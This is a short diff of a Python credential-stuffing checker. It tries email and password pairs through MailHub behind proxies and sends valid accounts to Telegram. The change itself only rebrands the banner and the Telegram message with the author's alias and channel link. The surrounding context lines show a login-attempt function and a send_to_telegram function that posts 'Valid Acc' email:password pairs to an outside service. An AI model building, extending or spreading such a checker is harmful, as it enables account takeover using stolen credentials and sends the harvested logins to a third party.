@@ -6,7 +6,7 @@ from mailhub import MailHub
 from concurrent.futures import ThreadPoolExecutor
 import os
 
-logo = pyfiglet.figlet_format('MASA')
+logo = pyfiglet.figlet_format('MASA THE GODFATHER ')
 print(logo)
 
 mail = MailHub()
@@ -41,9 +41,10 @@ def attempt_login(email, password, proxy, hits_file, local_hits_file):
 
 def send_to_telegram(email, password):
     message = f"""
-    Done Checker By Arabian Dark Knight
-    🫡 By Masa
-
+                                  THX FOR USE MY TOOL
+                                  Arabian Dark Knight
+                                  BY MASA THE GODFATHER
+                                  t.me/ArabianDarkKnight
     Valid Acc : {email}:{password}
 
 
